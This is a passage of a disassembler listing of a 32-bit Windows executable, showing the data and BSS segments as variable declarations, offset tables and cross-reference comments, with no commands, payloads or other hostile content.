					; sub_40BD58+17w
dword_416A00	dd 0			; DATA XREF: sub_40BD58+26w
dword_416A04	dd 0			; DATA XREF: sub_40BD58+71w
dword_416A08	dd 0			; DATA XREF: sub_40BD58+80w
dword_416A0C	dd 0			; DATA XREF: sub_40BD58+8Fw
dword_416A10	dd 0			; DATA XREF: sub_40BD58+9Ew
					; sub_40D61C+4B9r
dword_416A14	dd 0			; DATA XREF: sub_40BD58+ADw
					; sub_40CC4C+5Fr
dword_416A18	dd 0			; DATA XREF: sub_40BD58+BCw
					; sub_40D61C+1BFr ...
dword_416A1C	dd 0			; DATA XREF: sub_40BD58+CBw
dword_416A20	dd 0			; DATA XREF: sub_40BD58+DAw
					; sub_40D61C+4E6r
dword_416A24	dd 0			; DATA XREF: sub_40BD58+E9w
					; sub_40D61C+508r
dword_416A28	dd 0			; DATA XREF: sub_40BD58+F8w
dword_416A2C	dd 0			; DATA XREF: sub_40BD58+107w
					; sub_40D61C+5A1r
dword_416A30	dd 0			; DATA XREF: sub_40BD58+116w
					; sub_40D61C+2C6r ...
dword_416A34	dd 0			; DATA XREF: sub_40BD58+125w
					; sub_40D61C+1EAr ...
dword_416A38	dd 0			; DATA XREF: sub_40BD58+134w
dword_416A3C	dd 0			; DATA XREF: sub_40BD58+143w
					; sub_40D61C+338r
dword_416A40	dd 0			; DATA XREF: sub_40BD58+152w
					; sub_40D61C+5D5r
dword_416A44	dd 0			; DATA XREF: sub_40BD58+161w
					; sub_40CC4C+1Er
dword_416A48	dd 0			; DATA XREF: sub_40BD58+170w
					; sub_40CCE0+6r
dword_416A4C	dd 0			; DATA XREF: sub_40BD58+17Fw
					; sub_40D61C+5EBr
dword_416A50	dd 0			; DATA XREF: sub_40F0A4+91o
dword_416A54	dd 0			; DATA XREF: sub_40D61C+409r
					; sub_40D61C+447r ...
off_416A58	dd offset sub_40AA0C	; DATA XREF: sub_40CBCC+5Er
					; sub_40CD78+E4w ...
off_416A5C	dd offset sub_40CBCC	; DATA XREF: sub_40CC4C+70r
					; sub_40CD78+FBw ...
off_416A60	dd offset sub_40CC4C	; DATA XREF: sub_40CD78+22r
					; sub_40CD78+112w ...
dword_416A64	dd 8247C83h, 68157501h,	0 ; DATA XREF: sub_40CD78+193o
		db 68h
dword_416A71	dd 0			; DATA XREF: sub_40CD78+17Ew
		db 68h
dword_416A76	dd 0			; DATA XREF: sub_40CD78+186w
		dw 15FFh
		dd offset off_416A60
		dd 3 dup(0C2474FFh)
		db 0FFh, 15h
		dd offset dword_4176C0
		dw 0CC2h
		dd 408D00h
aSld		db 'SD$',8,'=',0       ; DATA XREF: sub_40CD78+1E6o
		align 10h
		dd 9750000h
		db 50h,	0FFh, 15h
		dd offset dword_4176C4
		db 0EBh
		db 1Dh,	50h, 0E8h
dword_416AAF	dd 0			; DATA XREF: sub_40CD78+1BFw
byte_416AB3	db 89h			; DATA XREF: sub_40CD78+1B9o
		dd 24448BC3h, 15FF5008h
		dd offset dword_4176C4
		dd 7400F883h, 0FB831Ah,	681575h, 68000000h
dword_416AD0	dd 0			; DATA XREF: sub_40CD78+1C7w
		db 68h
dword_416AD5	dd 0			; DATA XREF: sub_40CD78+1CFw
		db 0FFh, 15h
		dd offset off_416A60
		db 5Bh
		dd 900004C2h
dword_416AE4	dd 0E850h, 3D0000h, 58000000h, 25FF0A75h, 2 dup(0)
					; DATA XREF: sub_40F0A4+CC6o
		dd 25FFh, 0
		dd 0C08B0000h
byte_416B08	db 0			; DATA XREF: sub_410970+124r
					; sub_410970+137w ...
		db 8Dh,	40h, 0
dword_416B0C	dd 0			; DATA XREF: sub_410848+39r
					; sub_410970+25Cr ...
dword_416B10	dd 0			; DATA XREF: sub_4108A0+41r
					; sub_410970+2ECo ...
dword_416B14	dd 0			; DATA XREF: sub_410908+41r
					; sub_410970+265r ...
; HANDLE dword_416B18
dword_416B18	dd 0			; DATA XREF: sub_410970+405w
					; sub_411560+4Er ...
dword_416B1C	dd 0			; DATA XREF: sub_41508C+15Do
dword_416B20	dd 0			; DATA XREF: sub_41508C+153o
dword_416B24	dd 0			; DATA XREF: sub_414570+1Bw
					; sub_414570+32r ...
dword_416B28	dd 0			; DATA XREF: sub_414570+24w
dword_416B2C	dd 0			; DATA XREF: sub_414570+2Dw
dword_416B30	dd 0			; DATA XREF: sub_414570+44w
					; sub_414570+4Fw
dword_416B34	dd 0			; DATA XREF: sub_414570:loc_4145C4o
					; sub_41508C+149o
dword_416B38	dd 0			; DATA XREF: sub_41392C+C4r
					; sub_4145E0+1Br ...
		dd 7 dup(0)
off_416B58	dd offset dword_41281C	; DATA XREF: sub_41508C+70o
					; sub_41520C+37o
dword_416B5C	dd 0			; DATA XREF: sub_414D50+1Cw
					; sub_414D50:loc_414D71r ...
off_416B60	dd offset dword_4129B8	; DATA XREF: sub_41508C+5Bo
		dd offset dword_4129B8+0Ch
off_416B68	dd offset off_411C3C	; DATA XREF: sub_412B9C+43r
					; CODE:00415080o
off_416B6C	dd offset off_411C44	; DATA XREF: CODE:00415074o
tbyte_416B70	dt 1.0e18		; DATA XREF: sub_4133F5+63r
		dw 0C08Bh
dword_416B7C	dd 0Ah			; DATA XREF: sub_4130B0+23r
					; sub_4133F5+78r
off_416B80	dd offset off_411CC4	; DATA XREF: sub_4136A4+3Ao
					; CODE:00415068o
off_416B84	dd offset off_411CCC	; DATA XREF: CODE:0041505Co
off_416B88	dd offset off_411CD4	; DATA XREF: CODE:00415050o
off_416B8C	dd offset off_411CDC	; DATA XREF: CODE:00415044o
off_416B90	dd offset off_411CE4	; DATA XREF: CODE:00415038o
off_416B94	dd offset off_411CEC	; DATA XREF: CODE:0041502Co
off_416B98	dd offset off_411CF4	; DATA XREF: CODE:00415020o
off_416B9C	dd offset off_411CFC	; DATA XREF: CODE:00415014o
off_416BA0	dd offset off_411D04	; DATA XREF: CODE:00415008o
off_416BA4	dd offset off_411D0C	; DATA XREF: CODE:00414FFCo
off_416BA8	dd offset off_411D14	; DATA XREF: CODE:00414FF0o
off_416BAC	dd offset off_411D1C	; DATA XREF: CODE:00414FE4o
off_416BB0	dd offset off_411D24	; DATA XREF: sub_4136A4+5Do
					; CODE:00414FD8o
off_416BB4	dd offset off_411D2C	; DATA XREF: CODE:00414FCCo
off_416BB8	dd offset off_411D34	; DATA XREF: CODE:00414FC0o
off_416BBC	dd offset off_411D3C	; DATA XREF: CODE:00414FB4o
off_416BC0	dd offset off_411D44	; DATA XREF: CODE:00414FA8o
off_416BC4	dd offset off_411D4C	; DATA XREF: CODE:00414F9Co
off_416BC8	dd offset off_411D54	; DATA XREF: CODE:00414F90o
off_416BCC	dd offset off_411D5C	; DATA XREF: CODE:00414F84o
off_416BD0	dd offset off_411D64	; DATA XREF: CODE:00414F78o
off_416BD4	dd offset off_411D6C	; DATA XREF: CODE:00414F6Co
off_416BD8	dd offset off_411D74	; DATA XREF: CODE:00414F60o
off_416BDC	dd offset off_411D7C	; DATA XREF: CODE:00414F54o
off_416BE0	dd offset off_411D84	; DATA XREF: sub_4136A4+A9o
					; CODE:00414F48o
off_416BE4	dd offset off_411D8C	; DATA XREF: CODE:00414F3Co
off_416BE8	dd offset off_411D94	; DATA XREF: CODE:00414F30o
off_416BEC	dd offset off_411D9C	; DATA XREF: CODE:00414F24o
off_416BF0	dd offset off_411DA4	; DATA XREF: CODE:00414F18o
off_416BF4	dd offset off_411DAC	; DATA XREF: CODE:00414F0Co
off_416BF8	dd offset off_411DB4	; DATA XREF: CODE:00414F00o
off_416BFC	dd offset off_411DBC	; DATA XREF: sub_4136A4+CEo
					; CODE:00414EF4o
off_416C00	dd offset off_411DC4	; DATA XREF: CODE:00414EE8o
off_416C04	dd offset off_411DCC	; DATA XREF: CODE:00414EDCo
off_416C08	dd offset off_411DD4	; DATA XREF: CODE:00414ED0o
off_416C0C	dd offset off_411DDC	; DATA XREF: CODE:00414EC4o
off_416C10	dd offset off_411DE4	; DATA XREF: CODE:00414EB8o
off_416C14	dd offset off_411DEC	; DATA XREF: CODE:00414EACo
dword_416C18	dd 2			; DATA XREF: sub_413F68+16r
					; sub_41508C+46o
dword_416C1C	dd 0			; DATA XREF: sub_413F68+24r
					; CODE:00414EA0o
		dd 3
dword_416C24	dd 0			; DATA XREF: CODE:00414E98o
		dd 4
dword_416C2C	dd 0			; DATA XREF: CODE:00414E90o
		dd 5
dword_416C34	dd 0			; DATA XREF: CODE:00414E88o
dword_416C38	dd 64h			; DATA XREF: sub_413FE8+2Ao
					; sub_4141AC+Fr ...
dword_416C3C	dd 0			; DATA XREF: CODE:00414E80o
		dd 65h
dword_416C44	dd 0			; DATA XREF: CODE:00414E78o
		dd 6Ah
dword_416C4C	dd 0			; DATA XREF: CODE:00414E70o
off_416C50	dd offset dword_412100	; DATA XREF: sub_41508C+31o
dword_416C54	dd 0			; DATA XREF: CODE:00414E68o
		dd offset dword_412158
dword_416C5C	dd 0			; DATA XREF: CODE:00414E60o
		dd offset dword_4121B0
dword_416C64	dd 0			; DATA XREF: CODE:00414E58o
		dd offset dword_412264
dword_416C6C	dd 0			; DATA XREF: CODE:00414E50o
		dd offset dword_4122BC
dword_416C74	dd 0			; DATA XREF: CODE:00414E48o
		dd offset dword_412314
dword_416C7C	dd 0			; DATA XREF: CODE:00414E40o
		dd offset dword_41236C
dword_416C84	dd 0			; DATA XREF: CODE:00414E38o
		dd offset dword_412420
dword_416C8C	dd 0			; DATA XREF: CODE:00414E30o
		dd offset dword_4124D8
dword_416C94	dd 0			; DATA XREF: CODE:00414E28o
		dd offset dword_412538
dword_416C9C	dd 0			; DATA XREF: CODE:00414E20o
		dd offset dword_4125EC
dword_416CA4	dd 0			; DATA XREF: CODE:00414E18o
		dd offset dword_412590
dword_416CAC	dd 0			; DATA XREF: CODE:00414E10o
		dd offset dword_412644
dword_416CB4	dd 0			; DATA XREF: CODE:00414E08o
		dd offset dword_412644
dword_416CBC	dd 0			; DATA XREF: CODE:00414E00o
		dd offset dword_412644
dword_416CC4	dd 0			; DATA XREF: CODE:00414DF8o
		dd offset dword_412644
dword_416CCC	dd 0			; DATA XREF: CODE:00414DF0o
		dd offset dword_412644
dword_416CD4	dd 0			; DATA XREF: CODE:00414DE8o
		dd offset dword_412644
dword_416CDC	dd 0			; DATA XREF: CODE:00414DE0o
		dd offset dword_4126A0
dword_416CE4	dd 0			; DATA XREF: CODE:00414DD8o
		dd offset dword_412048
dword_416CEC	dd 0			; DATA XREF: CODE:00414DD0o
		dd offset dword_41275C
dword_416CF4	dd 0			; DATA XREF: CODE:00414DC8o
		dd offset dword_4127B8
dword_416CFC	dd 0			; DATA XREF: CODE:00414DC0o
dword_416D00	dd 20591EC1h		; DATA XREF: sub_41482C+Ar
dword_416D04	dd 0			; DATA XREF: sub_414D30+1o
off_416D08	dd offset off_411CDC	; DATA XREF: CODE:00415048o
off_416D0C	dd offset off_411C4C	; DATA XREF: CODE:00414DFCo
off_416D10	dd offset off_411B94	; DATA XREF: CODE:00414E94o
off_416D14	dd offset off_411D2C	; DATA XREF: CODE:00414FD0o
off_416D18	dd offset off_411D6C	; DATA XREF: CODE:00414F70o
off_416D1C	dd offset off_411DD4	; DATA XREF: CODE:00414ED4o
off_416D20	dd offset byte_417034	; DATA XREF: sub_4156A4+9r
off_416D24	dd offset off_411CFC	; DATA XREF: CODE:00415018o
off_416D28	dd offset dword_417028	; DATA XREF: sub_41446C+79r
off_416D2C	dd offset off_411C8C	; DATA XREF: sub_414390+73r
					; CODE:00414DD4o
off_416D30	dd offset off_411DE4	; DATA XREF: CODE:00414EBCo
off_416D34	dd offset dword_417008	; DATA XREF: sub_41446C+2Er
					; sub_4144F0:loc_414536r
off_416D38	dd offset off_411DBC	; DATA XREF: CODE:00414EF8o
off_416D3C	dd offset off_411CE4	; DATA XREF: CODE:0041503Co
off_416D40	dd offset off_411BAC	; DATA XREF: CODE:00414E7Co
off_416D44	dd offset off_411DC4	; DATA XREF: CODE:00414EECo
off_416D48	dd offset off_411DA4	; DATA XREF: CODE:00414F1Co
off_416D4C	dd offset off_411DCC	; DATA XREF: CODE:00414EE0o
off_416D50	dd offset dword_416938	; DATA XREF: sub_40D1F8+1F2r
off_416D54	dd offset dword_41701C	; DATA XREF: sub_407058r sub_407058+Ar ...
off_416D58	dd offset off_411B7C	; DATA XREF: sub_413F68+44r
off_416D5C	dd offset byte_417045	; DATA XREF: sub_411A80r
off_416D60	dd offset off_411C34	; DATA XREF: sub_413CE8+83r
off_416D64	dd offset off_411B74	; DATA XREF: sub_41446Cr
off_416D68	dd offset off_411D04	; DATA XREF: CODE:0041500Co
off_416D6C	dd offset off_411BB4	; DATA XREF: CODE:00414E74o
off_416D70	dd offset off_411C3C	; DATA XREF: CODE:00415084o
off_416D74	dd offset off_411CB4	; DATA XREF: CODE:loc_414114r
off_416D78	dd offset off_411C84	; DATA XREF: CODE:00414DECo
off_416D7C	dd offset off_411D54	; DATA XREF: CODE:00414F94o
off_416D80	dd offset dword_417214	; DATA XREF: sub_413CE8+1Er
off_416D84	dd offset off_411D74	; DATA XREF: CODE:00414F64o
off_416D88	dd offset dword_41700C	; DATA XREF: sub_41446C+51r
					; sub_4144F0+61r
off_416D8C	dd offset off_411D34	; DATA XREF: CODE:00414FC4o
off_416D90	dd offset dword_417004	; DATA XREF: sub_41446C+39r
					; sub_4144F0+4Fr
off_416D94	dd offset dword_417010	; DATA XREF: sub_407058+17r
					; sub_41446C+5Cr ...
off_416D98	dd offset off_411D7C	; DATA XREF: CODE:00414F58o
off_416D9C	dd offset off_411C14	; DATA XREF: CODE:00414E14o
off_416DA0	dd offset off_411C0C	; DATA XREF: CODE:00414E2Co
off_416DA4	dd offset off_411C1C	; DATA XREF: CODE:00414E1Co
off_416DA8	dd offset off_411DB4	; DATA XREF: CODE:00414F04o
off_416DAC	dd offset off_411B84	; DATA XREF: CODE:00414EA4o
off_416DB0	dd offset off_411BCC	; DATA XREF: CODE:00414E5Co
off_416DB4	dd offset off_411C44	; DATA XREF: CODE:00415078o
off_416DB8	dd offset off_411C64	; DATA XREF: CODE:00414DF4o
off_416DBC	dd offset off_411D24	; DATA XREF: CODE:00414FDCo
off_416DC0	dd offset off_411C9C	; DATA XREF: CODE:00414DCCo
off_416DC4	dd offset off_411D4C	; DATA XREF: CODE:00414FA0o
off_416DC8	dd offset off_411C7C	; DATA XREF: CODE:00414E04o
off_416DCC	dd offset off_411D3C	; DATA XREF: CODE:00414FB8o
off_416DD0	dd offset off_411D5C	; DATA XREF: CODE:00414F88o
off_416DD4	dd offset off_411C74	; DATA XREF: CODE:00414E0Co
off_416DD8	dd offset off_411CCC	; DATA XREF: CODE:00415060o
off_416DDC	dd offset off_411D0C	; DATA XREF: CODE:00415000o
off_416DE0	dd offset off_411D9C	; DATA XREF: CODE:00414F28o
off_416DE4	dd offset off_411BA4	; DATA XREF: CODE:00414E84o
off_416DE8	dd offset off_411BE4	; DATA XREF: CODE:00414E44o
off_416DEC	dd offset dword_41692C	; DATA XREF: sub_40D1F8+329r
off_416DF0	dd offset off_411D44	; DATA XREF: CODE:00414FACo
off_416DF4	dd offset off_411BF4	; DATA XREF: sub_41446C+17r
off_416DF8	dd offset off_411DAC	; DATA XREF: CODE:00414F10o
off_416DFC	dd offset off_411BEC	; DATA XREF: CODE:00414E3Co
off_416E00	dd offset off_411D84	; DATA XREF: CODE:00414F4Co
off_416E04	dd offset dword_417020	; DATA XREF: sub_41446C+6Cr
					; sub_4144F0+73r
off_416E08	dd offset off_411CA4	; DATA XREF: CODE:00414DC4o
off_416E0C	dd offset off_411C5C	; DATA XREF: sub_4141C4+54r
off_416E10	dd offset off_411C04	; DATA XREF: sub_4141C4+16Cr
off_416E14	dd offset off_411DDC	; DATA XREF: CODE:00414EC8o
off_416E18	dd offset off_411B9C	; DATA XREF: CODE:00414E8Co
off_416E1C	dd offset off_411C94	; DATA XREF: sub_41403C+38r
					; CODE:00414DDCo
off_416E20	dd offset off_411D64	; DATA XREF: CODE:00414F7Co
off_416E24	dd offset off_411D8C	; DATA XREF: CODE:00414F40o
off_416E28	dd offset byte_417044	; DATA XREF: sub_413CE8+14r
off_416E2C	dd offset off_411D94	; DATA XREF: CODE:00414F34o
off_416E30	dd offset off_411C6C	; DATA XREF: CODE:00414DE4o
off_416E34	dd offset off_411CBC	; DATA XREF: sub_4141C4+110r
off_416E38	dd offset off_411CF4	; DATA XREF: CODE:00415024o
off_416E3C	dd offset off_411CAC	; DATA XREF: sub_41403C+63r
off_416E40	dd offset off_411D14	; DATA XREF: CODE:00414FF4o
off_416E44	dd offset off_411DEC	; DATA XREF: CODE:00414EB0o
off_416E48	dd offset off_411CD4	; DATA XREF: CODE:00415054o
off_416E4C	dd offset off_411B8C	; DATA XREF: CODE:00414E9Co
off_416E50	dd offset off_411C24	; DATA XREF: CODE:00414E24o
off_416E54	dd offset off_411BC4	; DATA XREF: CODE:00414E64o
off_416E58	dd offset off_411BBC	; DATA XREF: CODE:00414E6Co
off_416E5C	dd offset off_411D1C	; DATA XREF: CODE:00414FE8o
off_416E60	dd offset dword_416928	; DATA XREF: sub_40D1F8+23Fr
off_416E64	dd offset off_411BD4	; DATA XREF: CODE:00414E54o
off_416E68	dd offset off_411CC4	; DATA XREF: CODE:0041506Co
off_416E6C	dd offset dword_416014	; DATA XREF: sub_412BF4+1r
					; sub_412BF4+Cr
off_416E70	dd offset off_411C2C	; DATA XREF: sub_413B60+DEr
off_416E74	dd offset off_411BFC	; DATA XREF: CODE:00414E34o
off_416E78	dd offset off_411BDC	; DATA XREF: CODE:00414E4Co
off_416E7C	dd offset off_411C54	; DATA XREF: sub_4141C4+45r
off_416E80	dd offset off_411CEC	; DATA XREF: CODE:00415030o
		align 200h
DATA		ends

; Section 3. (virtual address 00017000)
; Virtual size			: 00001075 (   4213.)
; Section size in file		: 00000000 (	  0.)
; Offset to raw	data for section: 00016200
; Flags	C0000000: Readable Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Regular
; Segment permissions: Read/Write
BSS		segment	para public '' use32
		assume cs:BSS
		;org 417000h
		assume es:nothing, ss:nothing, ds:CODE,	fs:nothing, gs:nothing
dword_417000	dd ?			; DATA XREF: sub_404E74+2Fw
dword_417004	dd ?			; DATA XREF: CODE:0040354Ar
					; DATA:off_416D90o
dword_417008	dd ?			; DATA XREF: sub_4025BC+9r
					; sub_4025BC+16r ...
dword_41700C	dd ?			; DATA XREF: CODE:00403107r
					; DATA:off_416D88o
dword_417010	dd ?			; DATA XREF: sub_402FBC+25r
					; CODE:00403193r ...
dword_417014	dd ?			; DATA XREF: sub_402EB8+14r
					; sub_402ED4+16r ...
dword_417018	dd ?			; DATA XREF: sub_402FBC+D2r
					; CODE:00403216r ...
dword_41701C	dd ?			; DATA XREF: DATA:off_416D54o
dword_417020	dd ?			; DATA XREF: DATA:off_416E04o
dword_417024	dd ?			; DATA XREF: sub_4038A4+A8r
					; sub_4038A4+B1r
dword_417028	dd ?			; DATA XREF: DATA:off_416D28o
dword_41702C	dd ?			; DATA XREF: sub_403678:loc_403717r
dword_417030	dd ?			; DATA XREF: sub_404E74+CDw
byte_417034	db ?			; DATA XREF: sub_403678+A8w
					; DATA:off_416D20o
		align 4
dword_417038	dd ?			; DATA XREF: sub_404E74+76w
dword_41703C	dd ?			; DATA XREF: sub_404E74+6Cw
dword_417040	dd ?			; DATA XREF: sub_4038A4+Eo
byte_417044	db ?			; DATA XREF: sub_403818+1r
					; DATA:off_416E28o
byte_417045	db ?			; DATA XREF: sub_401860+1Br
					; sub_401860:loc_401902r ...
byte_417046	db ?			; DATA XREF: sub_404E74+28w
		align 4
dword_417048	dd ?			; DATA XREF: sub_4026F8:loc_402737o
					; sub_404E20+19o
word_41704C	dw ?			; DATA XREF: sub_404E74+4Cw
		align 10h
		dd 71h dup(?)
dword_417214	dd ?			; DATA XREF: sub_4026A4:loc_4026C3o
					; sub_403818+1Eo ...
word_417218	dw ?			; DATA XREF: sub_403818+Ar
					; sub_404E74+55w
		align 10h
dword_417220	dd ?			; DATA XREF: sub_403818+15r
		align 10h
dword_417230	dd ?			; DATA XREF: sub_403818+23r
		dd 6Bh dup(?)
dword_4173E0	dd ?			; DATA XREF: sub_4026A4+26o
					; sub_404E20+2Do
word_4173E4	dw ?			; DATA XREF: sub_404E74+5Ew
		align 4
		dd 71h dup(?)
dword_4175AC	dd ?			; DATA XREF: sub_401AC8w
					; sub_401E58+92w ...
dword_4175B0	dd ?			; DATA XREF: sub_401AC8+16w
					; sub_401E58+9Bw ...
dword_4175B4	dd ?			; DATA XREF: sub_404E20+11w
					; sub_404E74w
; UINT CodePage
CodePage	dd ?			; DATA XREF: sub_403AB4+10r
					; sub_403AD4+Cr ...
byte_4175BC	db ?			; DATA XREF: sub_401860+8Ew
					; sub_401860:loc_40191Dr ...
		align 10h
dword_4175C0	dd ?			; DATA XREF: sub_401454+6Dw
					; sub_4015A0+63w ...
; struct _RTL_CRITICAL_SECTION CriticalSection
CriticalSection	_RTL_CRITICAL_SECTION <?> ; DATA XREF: sub_401860+11o
					; sub_401860+24o ...
; HLOCAL dword_4175DC
dword_4175DC	dd ?			; DATA XREF: sub_4011D4:loc_4011F7r
					; sub_4011D4+2Aw ...
dword_4175E0	dd ?			; DATA XREF: sub_4011D4+2o
					; sub_40125C+Ar ...
dword_4175E4	dd ?			; DATA XREF: sub_401378+3Eo
					; sub_4013DC+51o ...
		dd 3 dup(?)
dword_4175F4	dd 4 dup(?)		; DATA XREF: sub_401620+Bo
					; sub_4016B0+Eo ...
dword_417604	dd ?			; DATA XREF: sub_401860+7Fo
dword_417608	dd ?			; DATA XREF: sub_401E58:loc_401E68r
		align 10h
dword_417610	dd ?			; DATA XREF: sub_401860+89w
					; sub_401A04+1r ...
dword_417614	dd ?			; DATA XREF: sub_401CF4r sub_401CF4+9r ...
dword_417618	dd ?			; DATA XREF: sub_401CF4+26r
					; sub_401CF4+2Er ...
; HLOCAL hMem
hMem		dd ?			; DATA XREF: sub_401860+58w
					; sub_401860+5Dr ...
dword_417620	dd ?			; DATA XREF: sub_401860+42o
					; sub_401924+81o ...
		align 10h
dword_417630	dd ?			; DATA XREF: sub_4035B8+6o
					; sub_403678+3o ...
dword_417634	dd ?			; DATA XREF: sub_403570+17w
					; sub_403590+2r
dword_417638	dd ?			; DATA XREF: sub_403618+6r
					; sub_403678+2Aw
dword_41763C	dd ?			; DATA XREF: sub_403618+2Cw
					; sub_403678:loc_4036C0w
dword_417640	dd ?			; DATA XREF: sub_403678+2Fw
dword_417644	dd ?			; DATA XREF: sub_403678+1Ew
dword_417648	dd ?			; DATA XREF: sub_403678+24w
dword_41764C	dd ?			; DATA XREF: sub_403678+18w
dword_417650	dd ?			; DATA XREF: sub_403678+12w
dword_417654	dd ?			; DATA XREF: sub_403678+74w
byte_417658	db ?			; DATA XREF: sub_403678+6Bw
		align 4
byte_41765C	db ?			; DATA XREF: sub_405048r sub_405094+Dw
byte_41765D	db ?			; DATA XREF: sub_41520C+2Er
		align 10h
; HMODULE hModule
hModule		dd ?			; DATA XREF: sub_405094+17w
					; sub_410970+3B9r ...
dword_417664	dd ?			; DATA XREF: sub_405094:loc_4050C9r
dword_417668	dd ?			; DATA XREF: sub_4050DC+11w
					; CODE:loc_40510Cw
dword_41766C	dd ?			; DATA XREF: sub_404FD0+23w
					; sub_405048:loc_405077r
dword_417670	dd ?			; DATA XREF: sub_405114+11w
					; sub_405144w
dword_417674	dd ?			; DATA XREF: sub_40542C+11w
					; sub_40545Cw
dword_417678	dd ?			; DATA XREF: sub_405564+11w
					; sub_405594w
dword_41767C	dd ?			; DATA XREF: sub_40559C+11w
					; sub_4055CCw
dword_417680	dd ?			; DATA XREF: sub_406620+11w
					; sub_406650w
dword_417684	dd ?			; DATA XREF: sub_40707C+11w
					; sub_4070D4+11w
dword_417688	dd 8 dup(?)		; DATA XREF: sub_40707C+2Eo
dword_4176A8	dd ?			; DATA XREF: sub_40707C+1Eo
dword_4176AC	dd ?			; DATA XREF: sub_409D50+11w
					; sub_409D80w
dword_4176B0	dd ?			; DATA XREF: sub_4097D4+16r
					; sub_4097D4+4Ew ...
dword_4176B4	dd ?			; DATA XREF: sub_4098EC+16r
					; sub_4098EC+42w ...
dword_4176B8	dd ?			; DATA XREF: sub_40BD20+11w
					; sub_40BD50w
dword_4176BC	dd ?			; DATA XREF: sub_411AB4+11w
					; sub_411B3C+11w
dword_4176C0	dd ?			; DATA XREF: sub_40CD78+198o
					; DATA:00416A8Eo
dword_4176C4	dd ?			; DATA XREF: sub_40CD78+1EBo
					; DATA:00416AA7o ...
dword_4176C8	dd ?			; DATA XREF: sub_40D00C+70r
					; sub_40D00C+8Br ...
dword_4176CC	dd ?			; DATA XREF: sub_40ED30+42o
					; sub_411AB4+4Eo
dword_4176D0	dd ?			; DATA XREF: sub_40ED30+62o
					; sub_411AB4+3Eo
dword_4176D4	dd ?			; DATA XREF: sub_40ED30+82o
					; sub_411AB4+2Eo
; struct _RTL_CRITICAL_SECTION stru_4176D8
stru_4176D8	_RTL_CRITICAL_SECTION <?> ; DATA XREF: sub_410970+12Do
					; sub_410970:loc_410AAEo ...
dword_4176F0	dd ?			; DATA XREF: sub_410970+156r
					; sub_410970+168o ...
dword_4176F4	dd ?			; DATA XREF: sub_411DF4+11w
					; sub_411E24w
dword_4176F8	dd ?			; DATA XREF: sub_4130F4+1Cr
					; sub_4149B8+52o ...
byte_4176FC	db ?			; DATA XREF: sub_4130F4+24r
					; sub_4149B8+7Bw
byte_4176FD	db ?			; DATA XREF: sub_4130F4+2Cr
					; sub_4149B8+9Fw
byte_4176FE	db ?			; DATA XREF: sub_4130F4+14r
					; sub_4149B8+B2w
byte_4176FF	db ?			; DATA XREF: sub_4130F4+Cr
					; sub_4149B8+C5w
byte_417700	db ?			; DATA XREF: sub_412D4E+1F9r
					; sub_4149B8+E9w
byte_417701	db ?			; DATA XREF: sub_4149B8+FCw
		align 4
dword_417704	dd ?			; DATA XREF: sub_4149B8+124o
					; sub_41508C+135o
dword_417708	dd ?			; DATA XREF: sub_4149B8+151o
					; sub_41508C+12Bo
byte_41770C	db ?			; DATA XREF: sub_4149B8+169w
		align 10h
dword_417710	dd ?			; DATA XREF: sub_4149B8+186o
					; sub_41508C+121o
dword_417714	dd ?			; DATA XREF: sub_4149B8+1A8o
					; sub_41508C+117o
dword_417718	dd ?			; DATA XREF: sub_4149B8+271o
					; sub_41508C+10Do
dword_41771C	dd ?			; DATA XREF: sub_4149B8+28Eo
					; sub_41508C+103o
dword_417720	dd 0Ch dup(?)		; DATA XREF: sub_4136A4+29o
					; sub_41508C+EEo
dword_417750	dd 0Ch dup(?)		; DATA XREF: sub_4136A4+2Eo
					; sub_41508C+D9o
dword_417780	dd 7 dup(?)		; DATA XREF: sub_4136A4+8Ao
					; sub_41508C+C4o
dword_41779C	dd 7 dup(?)		; DATA XREF: sub_4136A4+8Fo
					; sub_41508C+AFo
; LCID Locale
Locale		dd ?			; DATA XREF: sub_4147CC+Er
					; sub_414844+Cw ...
dword_4177BC	dd ?			; DATA XREF: sub_41392C+5Cr
					; sub_41482Cr ...
dword_4177C0	dd ?			; DATA XREF: sub_414844+20w
					; sub_414844+53w
dword_4177C4	dd ?			; DATA XREF: CalInfoEnumProc:loc_4137DCr
					; CalInfoEnumProc+1Eo ...
dword_4177C8	dd 6 dup(?)		; DATA XREF: sub_41508C+9Ao
dword_4177E0	dd ?			; DATA XREF: sub_413804:loc_413828r
					; sub_413804+43w
dword_4177E4	dd 7 dup(?)		; DATA XREF: sub_41387C+5Do
dword_417800	dd ?			; DATA XREF: sub_41508C+8Ao
dword_417804	dd ?			; DATA XREF: sub_41508C+7Ao
dword_417808	dd ?			; DATA XREF: sub_41508C+11w
					; sub_41520C+11w
dword_41780C	dd ?			; DATA XREF: sub_413FE8:loc_413FFDr
					; sub_41446C+12w ...
dword_417810	dd ?			; DATA XREF: sub_413FE8:loc_414005r
					; sub_41446C+29w ...
dword_417814	dd ?			; DATA XREF: sub_41508C+1Do
dword_417818	dd ?			; DATA XREF: sub_41528C+11w
					; sub_4152BCw
; HANDLE hFileMappingObject
hFileMappingObject dd ?			; DATA XREF: sub_4157B4+40w
					; sub_4157B4+52r ...
dword_417820	dd ?			; DATA XREF: sub_4157B4+6Ew
					; sub_4157B4+73r ...
dword_417824	dd ?			; DATA XREF: sub_415398+46r
					; CODE:00415A50o ...
dword_417828	dd ?			; DATA XREF: sub_415398+16r
					; CODE:00415910o ...
dword_41782C	dd ?			; DATA XREF: sub_415398+2Er
					; CODE:004159A8o ...
dword_417830	dd ?			; DATA XREF: sub_415398+5Er
					; CODE:0041595Bo ...
dword_417834	dd ?			; DATA XREF: sub_4154A8:loc_4154FCr
					; sub_41557C+87r ...
dword_417838	dd ?			; DATA XREF: sub_4152C4+57r
					; sub_41536C+Dr ...
; const	WCHAR String2
String2		dw ?			; DATA XREF: sub_41542C+16o
					; CODE:00415AA5o
		align 10h
		dd 81h dup(?)
; const	WCHAR word_417A44
word_417A44	dw ?			; DATA XREF: sub_41542C+28o
					; CODE:00415A69o
		align 4
		dd 81h dup(?)
; const	WCHAR word_417C4C
word_417C4C	dw ?			; DATA XREF: sub_41542C+4Co
					; CODE:00415AC3o
		align 10h
		dd 81h dup(?)
; const	WCHAR word_417E54
word_417E54	dw ?			; DATA XREF: sub_41542C+3Ao
					; CODE:00415A87o
		align 4
		dd 81h dup(?)
dword_41805C	dd ?			; DATA XREF: sub_4152C4+27r
					; CODE:00415C8Ao
dword_418060	dd ?			; DATA XREF: sub_415398+Er
					; CODE:00415C3Bo
dword_418064	dd ?			; DATA XREF: sub_41542C+Er
					; CODE:00415C56o
